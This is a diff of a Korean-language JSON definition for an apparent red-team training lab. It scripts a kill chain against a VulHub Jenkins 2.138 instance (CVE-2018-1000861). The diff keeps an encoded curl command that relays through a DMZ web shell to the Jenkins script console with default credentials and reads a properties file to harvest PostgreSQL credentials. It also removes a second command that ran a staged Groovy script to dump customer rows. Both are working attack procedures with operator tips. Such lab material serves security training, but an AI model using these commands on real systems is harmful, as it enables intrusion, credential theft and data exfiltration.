@@ -1,20 +1,17 @@
 {
-  "_note": "핵심층 환경 — corp 킬체인 ★ 내부→크라운 전 자격증명 탈취. Jenkins 2.138 VulHub 공식 교육 환경(기본 자격증명 admin:admin — init.groovy 가 createAccount 로 기본 생성) 스크립트 콘솔 Groovy 실행 → /opt/deploy/corp-db.properties 읽어 크라운 DB 접속정보 수집. killchain-1(ShopFlow)과 같은 T1552.001 기법·다른 절차. 조건 문법은 postgres.json(canonical) 참고. 진행도 선저작.",
+  "_note": "핵심층 환경 — corp 킬체인 ★ 내부→크라운 전 자격증명 탈취(진행도). Jenkins 2.138 VulHub 공식 교육 환경(기본 자격증명 admin:admin — init.groovy 가 createAccount 로 기본 생성) 스크립트 콘솔 Groovy 실행 → /opt/deploy/corp-db.properties 읽어 크라운 DB 접속정보 수집. killchain-1(ShopFlow)과 같은 T1552.001 기법·다른 절차. 크라운 반출은 corp-crown-read(T1213)가 담당한다. 조건 문법은 postgres.json(canonical) 참고. 진행도 선저작.",
   "env": "corp-jenkins-cred",
   "technique": "T1552.001",
   "cve": "CVE-2018-1000861",
   "procedure": {
     "id": "PROC-corp-jenkins-cred",
     "name": "Jenkins 스크립트 콘솔 RCE→DB 자격증명 탈취",
-    "description": "Jenkins(jenkins.corp-internal.svc.cluster.local:8080) 스크립트 콘솔에 기본 자격증명(admin:admin — VulHub 공식 교육 환경)으로 접근해 임의 Groovy 를 실행, 배포 파일 /opt/deploy/corp-db.properties 를 읽고 크라운 PostgreSQL 접속정보(CORP_DB_USER=postgres, CORP_DB_PASS=postgres, CORP_DB_HOST=postgres.corp-crown.svc.cluster.local)를 수집한다. ★수집한 자격증명의 최종 용도는 postgres.corp-crown 에 직접 접속해 customers·ops_secrets 를 SELECT 하는 것(T1213 크라운)이다.",
+    "description": "Jenkins(jenkins.corp-internal.svc.cluster.local:8080) 스크립트 콘솔에 기본 자격증명(admin:admin — VulHub 공식 교육 환경)으로 접근해 임의 Groovy 를 실행, 배포 파일 /opt/deploy/corp-db.properties 를 읽고 크라운 PostgreSQL 접속정보(CORP_DB_USER=postgres, CORP_DB_PASS=postgres, CORP_DB_HOST=postgres.corp-crown.svc.cluster.local)를 수집한다 — T1552.001 자격증명 수집(진행도). ★ 이 KG 는 자격증명 수집만 담당. 수집한 접속정보로 실제 크라운 데이터를 반출하는 절차는 corp-crown-read(T1213) 를 쓴다.",
     "status": "AUTHORED",
     "steps": [
       {"id": "STEP-corp-jenkins-groovy", "seq": 1,
        "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20-u%20admin%3Aadmin%20%27http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2FscriptText%27%20--data-urlencode%20%27script%3Dprintln%20new%20File%28%22%2Fopt%2Fdeploy%2Fcorp-db.properties%22%29.text%27'",
-       "description": "★ DMZ 웹셸(shell.jsp)을 중계로 Jenkins 스크립트 콘솔 Groovy 실행. ext 발판에서 jenkins.corp-internal 로 직접 치면 NetworkPolicy 차단으로 timeout — 반드시 DMZ RCE(STEP-corp-tomcat-exec 선행) 발판에서 중계. ★ 인증 필수: `-u admin:admin` (VulHub 공식 교육 이미지 기본 자격증명). ★ 엔드포인트: `/scriptText` 쓰면 평문 응답(권장). `/script` 는 HTML 페이지로 응답을 감싸 파싱이 번거로움. 응답에서 'CORP_DB_USER=postgres', 'CORP_DB_PASS=postgres', 'CORP_DB_HOST=postgres.corp-crown.svc.cluster.local' 라인을 확인(진행도 수집). PWD= 등 shell 환경변수를 자격증명으로 오해하지 말 것 — 실제 자격증명은 반드시 `CORP_DB_` 접두 라인이다."},
-      {"id": "STEP-corp-crown-select", "seq": 2,
-       "command": "curl -s 'http://waf.corp-dmz.svc.cluster.local/shell.jsp?cmd=curl%20-s%20-u%20admin%3Aadmin%20--data-urlencode%20%27script%3Devaluate%28new%20File%28%22%2Fopt%2Fpayload%2Fcrown-read.groovy%22%29.text%29%27%20http%3A%2F%2Fjenkins.corp-internal.svc.cluster.local%3A8080%2FscriptText'",
-       "description": "★ Jenkins Pod 에 운영팀 상비 스크립트 `/opt/payload/crown-read.groovy` 가 ConfigMap 으로 사전배치되어 있다 — 공개 경로 자원이라 `evaluate(new File(...).text)` 로 바로 실행 가능. 이 스크립트는 postgres JDBC jar(/var/jenkins_home/.groovy/lib/postgresql.jar)를 URLClassLoader 로 로드해 corp-crown/postgres 에 접속 후 customers 를 SELECT. ★ 응답 형식: `CROWN_COLS:<컬럼1>,<컬럼2>,...` 한 줄 + `CROWN_ROW:<값1>|<값2>|...` 10줄. 이 응답이 **T1213 크라운 데이터 반출의 최종 산출물**. ★ 공격자 자율: 스크립트 내용을 먼저 확인하고 싶으면 `cat /opt/payload/crown-read.groovy` 선행 가능, 또는 바로 evaluate 호출."}
+       "description": "★ DMZ 웹셸(shell.jsp)을 중계로 Jenkins 스크립트 콘솔 Groovy 실행. ext 발판에서 jenkins.corp-internal 로 직접 치면 NetworkPolicy 차단으로 timeout — 반드시 DMZ RCE(STEP-corp-tomcat-exec 선행) 발판에서 중계. ★ 인증 필수: `-u admin:admin` (VulHub 공식 교육 이미지 기본 자격증명). ★ 엔드포인트: `/scriptText` 쓰면 평문 응답(권장). `/script` 는 HTML 페이지로 응답을 감싸 파싱이 번거로움. 응답에서 'CORP_DB_USER=postgres', 'CORP_DB_PASS=postgres', 'CORP_DB_HOST=postgres.corp-crown.svc.cluster.local' 라인을 확인(진행도 수집). PWD= 등 shell 환경변수를 자격증명으로 오해하지 말 것 — 실제 자격증명은 반드시 `CORP_DB_` 접두 라인이다."}
     ]
   },
   "preconditions": [
